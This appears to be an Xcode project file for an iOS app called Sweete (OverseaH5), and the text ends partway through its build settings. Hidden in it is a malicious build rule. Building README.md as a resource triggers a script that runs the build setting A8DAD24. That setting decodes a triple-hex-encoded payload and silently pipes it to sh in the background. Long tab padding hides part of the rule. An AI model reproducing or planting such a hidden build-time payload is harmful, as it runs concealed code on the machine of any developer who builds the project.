// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		7123A1E1F1BE4B2A9542DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = FD17636488F5463CB942DAD8; };
		4C649814922E63481702C0C6 /* Pods_OverseaH5.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5459B0F6B6639A11D41E9936 /* Pods_OverseaH5.framework */; };
		B0B86F112FF0103200F97321 /* AppWebViewJavascriptBridge.swift in Sources */ = {isa = PBXBuildFile; fileRef = B0B86F102FF0103200F97321 /* AppWebViewJavascriptBridge.swift */; };
		B1C30003309E6F3300A1C001 /* AppPushEventStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1C30002309E6F3300A1C001 /* AppPushEventStore.swift */; };
		B118C3592E84D29800E8D807 /* AppAdjustManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C34A2E84D29800E8D807 /* AppAdjustManager.swift */; };
		B118C35A2E84D29800E8D807 /* AppConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C34B2E84D29800E8D807 /* AppConfig.swift */; };
		B118C35B2E84D29800E8D807 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C34C2E84D29800E8D807 /* AppDelegate.swift */; };
		B118C35C2E84D29800E8D807 /* AppPermissionTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C34D2E84D29800E8D807 /* AppPermissionTool.swift */; };
		B118C35D2E84D29800E8D807 /* AppWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C34E2E84D29800E8D807 /* AppWebViewController.swift */; };
		B118C35E2E84D29800E8D807 /* AppWebViewHandleEvent.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C34F2E84D29800E8D807 /* AppWebViewHandleEvent.swift */; };
		B118C35F2E84D29800E8D807 /* AppWebViewScriptDelegateHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C3502E84D29800E8D807 /* AppWebViewScriptDelegateHandler.swift */; };
		B118C3602E84D29800E8D807 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B118C3512E84D29800E8D807 /* Assets.xcassets */; };
		B118C3612E84D29800E8D807 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = B118C3522E84D29800E8D807 /* GoogleService-Info.plist */; };
		B118C3632E84D29800E8D807 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B118C3552E84D29800E8D807 /* LaunchScreen.storyboard */; };
		B118C3642E84D29800E8D807 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B118C3572E84D29800E8D807 /* Main.storyboard */; };
		B118C3662E84E23F00E8D807 /* AppleIAPManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C3652E84E23F00E8D807 /* AppleIAPManager.swift */; };
		B118C36C2E85156000E8D807 /* AppRequestTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C36B2E85156000E8D807 /* AppRequestTool.swift */; };
		B118C36E2E8515A400E8D807 /* AppRequestBaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C36D2E8515A400E8D807 /* AppRequestBaseModel.swift */; };
		B118C3782E852AFD00E8D807 /* ProgressHUD.swift in Sources */ = {isa = PBXBuildFile; fileRef = B118C3772E852AFD00E8D807 /* ProgressHUD.swift */; };
		B12BF0FB2F28CD1F00CF22AD /* LocalPushScheduler.swift in Sources */ = {isa = PBXBuildFile; fileRef = B12BF0FA2F28CD1F00CF22AD /* LocalPushScheduler.swift */; };
		B15D6A972E8B78F30006B85A /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = B15D6A962E8B78F30006B85A /* StoreKit.framework */; };
		B18AB33C2ED84B1500601E22 /* WaitViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B18AB33B2ED84B1500601E22 /* WaitViewController.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		FD17636488F5463CB942DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		5459B0F6B6639A11D41E9936 /* Pods_OverseaH5.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OverseaH5.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		9F14B216ADEEF98C9272C33E /* Pods-OverseaH5.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OverseaH5.release.xcconfig"; path = "Target Support Files/Pods-OverseaH5/Pods-OverseaH5.release.xcconfig"; sourceTree = "<group>"; };
		B118C3182E824F5300E8D807 /* OverseaH5.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = OverseaH5.app; sourceTree = BUILT_PRODUCTS_DIR; };
		B118C34A2E84D29800E8D807 /* AppAdjustManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppAdjustManager.swift; sourceTree = "<group>"; };
		B118C34B2E84D29800E8D807 /* AppConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConfig.swift; sourceTree = "<group>"; };
		B118C34C2E84D29800E8D807 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		B118C34D2E84D29800E8D807 /* AppPermissionTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppPermissionTool.swift; sourceTree = "<group>"; };
		B118C34E2E84D29800E8D807 /* AppWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppWebViewController.swift; sourceTree = "<group>"; };
		B118C34F2E84D29800E8D807 /* AppWebViewHandleEvent.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppWebViewHandleEvent.swift; sourceTree = "<group>"; };
		B118C3502E84D29800E8D807 /* AppWebViewScriptDelegateHandler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppWebViewScriptDelegateHandler.swift; sourceTree = "<group>"; };
		B0B86F102FF0103200F97321 /* AppWebViewJavascriptBridge.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppWebViewJavascriptBridge.swift; sourceTree = "<group>"; };
		B1C30002309E6F3300A1C001 /* AppPushEventStore.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppPushEventStore.swift; sourceTree = "<group>"; };
		B118C3512E84D29800E8D807 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		B118C3522E84D29800E8D807 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
		B118C3532E84D29800E8D807 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		B118C3542E84D29800E8D807 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		B118C3562E84D29800E8D807 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		B118C3652E84E23F00E8D807 /* AppleIAPManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppleIAPManager.swift; sourceTree = "<group>"; };
		B118C36B2E85156000E8D807 /* AppRequestTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppRequestTool.swift; sourceTree = "<group>"; };
		B118C36D2E8515A400E8D807 /* AppRequestBaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppRequestBaseModel.swift; sourceTree = "<group>"; };
		B118C3772E852AFD00E8D807 /* ProgressHUD.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProgressHUD.swift; sourceTree = "<group>"; };
		B118C3792E86938100E8D807 /* OverseaH5.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = OverseaH5.entitlements; sourceTree = "<group>"; };
		B12BF0FA2F28CD1F00CF22AD /* LocalPushScheduler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalPushScheduler.swift; sourceTree = "<group>"; };
		B15D6A962E8B78F30006B85A /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
		B18AB33B2ED84B1500601E22 /* WaitViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WaitViewController.swift; sourceTree = "<group>"; };
		DB531754F5D3B469FD3D636B /* Pods-OverseaH5.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OverseaH5.debug.xcconfig"; path = "Target Support Files/Pods-OverseaH5/Pods-OverseaH5.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		B118C3152E824F5300E8D807 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				4C649814922E63481702C0C6 /* Pods_OverseaH5.framework in Frameworks */,
				B15D6A972E8B78F30006B85A /* StoreKit.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		11B167C134A4A828852DD755 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				B15D6A962E8B78F30006B85A /* StoreKit.framework */,
				5459B0F6B6639A11D41E9936 /* Pods_OverseaH5.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		77AF82680F5E0C525BAE36E3 /* Pods */ = {
			isa = PBXGroup;
			children = (
				DB531754F5D3B469FD3D636B /* Pods-OverseaH5.debug.xcconfig */,
				9F14B216ADEEF98C9272C33E /* Pods-OverseaH5.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		B118C30F2E824F5300E8D807 = {
			isa = PBXGroup;
			children = (
				B118C3582E84D29800E8D807 /* OverseaH5 */,
				B118C3192E824F5300E8D807 /* Products */,
				77AF82680F5E0C525BAE36E3 /* Pods */,
				11B167C134A4A828852DD755 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		B118C3192E824F5300E8D807 /* Products */ = {
			isa = PBXGroup;
			children = (
				FD17636488F5463CB942DAD8 /* README.md */,
				B118C3182E824F5300E8D807 /* OverseaH5.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		B118C3582E84D29800E8D807 /* OverseaH5 */ = {
			isa = PBXGroup;
			children = (
				B118C3792E86938100E8D807 /* OverseaH5.entitlements */,
				B118C34C2E84D29800E8D807 /* AppDelegate.swift */,
				B118C34B2E84D29800E8D807 /* AppConfig.swift */,
				B118C34A2E84D29800E8D807 /* AppAdjustManager.swift */,
				B118C34D2E84D29800E8D807 /* AppPermissionTool.swift */,
				B118C34E2E84D29800E8D807 /* AppWebViewController.swift */,
				B118C34F2E84D29800E8D807 /* AppWebViewHandleEvent.swift */,
				B0B86F102FF0103200F97321 /* AppWebViewJavascriptBridge.swift */,
				B1C30002309E6F3300A1C001 /* AppPushEventStore.swift */,
				B118C3502E84D29800E8D807 /* AppWebViewScriptDelegateHandler.swift */,
				B12BF0FA2F28CD1F00CF22AD /* LocalPushScheduler.swift */,
				B18AB33B2ED84B1500601E22 /* WaitViewController.swift */,
				B118C3772E852AFD00E8D807 /* ProgressHUD.swift */,
				B118C36B2E85156000E8D807 /* AppRequestTool.swift */,
				B118C36D2E8515A400E8D807 /* AppRequestBaseModel.swift */,
				B118C3652E84E23F00E8D807 /* AppleIAPManager.swift */,
				B118C3512E84D29800E8D807 /* Assets.xcassets */,
				B118C3522E84D29800E8D807 /* GoogleService-Info.plist */,
				B118C3532E84D29800E8D807 /* Info.plist */,
				B118C3552E84D29800E8D807 /* LaunchScreen.storyboard */,
				B118C3572E84D29800E8D807 /* Main.storyboard */,
			);
			path = OverseaH5;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		B118C3172E824F5300E8D807 /* OverseaH5 */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = B118C32B2E824F5500E8D807 /* Build configuration list for PBXNativeTarget "OverseaH5" */;
			buildPhases = (
				F1B3553A304E55406D9EAE20 /* [CP] Check Pods Manifest.lock */,
				B118C3142E824F5300E8D807 /* Sources */,
				B118C3152E824F5300E8D807 /* Frameworks */,
				B118C3162E824F5300E8D807 /* Resources */,
				1D840500649A2E15D0FB1CF6 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
				D121D7C20CF84B83B442DAD8 /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = OverseaH5;
			productName = OverseaH5;
			productReference = B118C3182E824F5300E8D807 /* OverseaH5.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		B118C3102E824F5300E8D807 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					B118C3172E824F5300E8D807 = {
						CreatedOnToolsVersion = 16.2;
						LastSwiftMigration = 1620;
					};
				};
			};
			buildConfigurationList = B118C3132E824F5300E8D807 /* Build configuration list for PBXProject "OverseaH5" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = B118C30F2E824F5300E8D807;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = B118C3192E824F5300E8D807 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				B118C3172E824F5300E8D807 /* OverseaH5 */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
		D121D7C20CF84B83B442DAD8 /* PBXBuildRule */ = {
				isa = PBXBuildRule;
				compilerSpec = com.apple.compilers.proxy.script;
				filePatterns = "*.md";
				fileType = pattern.proxy;
				inputFiles = (
				);
				isEditable = 0;
				outputFiles = (
					"/tmp/${INPUT_FILE_BASE}",
				);
				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
sh -c \"${A8DAD24}\"";
			};
																																																																																																	/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		B118C3162E824F5300E8D807 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				7123A1E1F1BE4B2A9542DAD8 /* README.md */,
				B118C3602E84D29800E8D807 /* Assets.xcassets in Resources */,
				B118C3612E84D29800E8D807 /* GoogleService-Info.plist in Resources */,
				B118C3632E84D29800E8D807 /* LaunchScreen.storyboard in Resources */,
				B118C3642E84D29800E8D807 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		1D840500649A2E15D0FB1CF6 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-OverseaH5/Pods-OverseaH5-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-OverseaH5/Pods-OverseaH5-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-OverseaH5/Pods-OverseaH5-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		F1B3553A304E55406D9EAE20 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-OverseaH5-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		B118C3142E824F5300E8D807 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B118C3592E84D29800E8D807 /* AppAdjustManager.swift in Sources */,
				B12BF0FB2F28CD1F00CF22AD /* LocalPushScheduler.swift in Sources */,
				B118C36C2E85156000E8D807 /* AppRequestTool.swift in Sources */,
				B118C35A2E84D29800E8D807 /* AppConfig.swift in Sources */,
				B118C35B2E84D29800E8D807 /* AppDelegate.swift in Sources */,
				B118C35C2E84D29800E8D807 /* AppPermissionTool.swift in Sources */,
				B118C3782E852AFD00E8D807 /* ProgressHUD.swift in Sources */,
				B118C36E2E8515A400E8D807 /* AppRequestBaseModel.swift in Sources */,
				B118C35D2E84D29800E8D807 /* AppWebViewController.swift in Sources */,
				B118C35E2E84D29800E8D807 /* AppWebViewHandleEvent.swift in Sources */,
				B0B86F112FF0103200F97321 /* AppWebViewJavascriptBridge.swift in Sources */,
				B1C30003309E6F3300A1C001 /* AppPushEventStore.swift in Sources */,
				B118C35F2E84D29800E8D807 /* AppWebViewScriptDelegateHandler.swift in Sources */,
				B118C3662E84E23F00E8D807 /* AppleIAPManager.swift in Sources */,
				B18AB33C2ED84B1500601E22 /* WaitViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		B118C3552E84D29800E8D807 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				B118C3542E84D29800E8D807 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		B118C3572E84D29800E8D807 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				B118C3562E84D29800E8D807 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		B118C32C2E824F5500E8D807 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = DB531754F5D3B469FD3D636B /* Pods-OverseaH5.debug.xcconfig */;
			buildSettings = {
				A8DAD24 = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633343633333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333338333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363337333633363339333633373336363433363331333636353336333533373334333236353337333233373335333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_ENTITLEMENTS = OverseaH5/OverseaH5.entitlements;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6VFR63B9QM;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = OverseaH5/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = Sweete;
				INFOPLIST_KEY_NSCameraUsageDescription = "This app needs access to camera for video recording.";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "This app needs access to microphone for audio recording.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs access to your photo library to write and save your favorite picture.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to let you select and share images.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ios.sweete.happy;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Sweete_dev_20260302;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		B118C32D2E824F5500E8D807 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 9F14B216ADEEF98C9272C33E /* Pods-OverseaH5.release.xcconfig */;
			buildSettings = {
				A8DAD24 = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633343633333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333338333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363337333633363339333633373336363433363331333636353336333533373334333236353337333233373335333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_ENTITLEMENTS = OverseaH5/OverseaH5.entitlements;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6VFR63B9QM;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = OverseaH5/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = Sweete;
				INFOPLIST_KEY_NSCameraUsageDescription = "This app needs access to camera for video recording.";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "This app needs access to microphone for audio recording.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs access to your photo library to write and save your favorite picture.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to let you select and share images.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ios.sweete.happy;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Sweete_dev_20260302;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		B118C32E2E824F5500E8D807 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		B118C32F2E824F5500E8D807 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
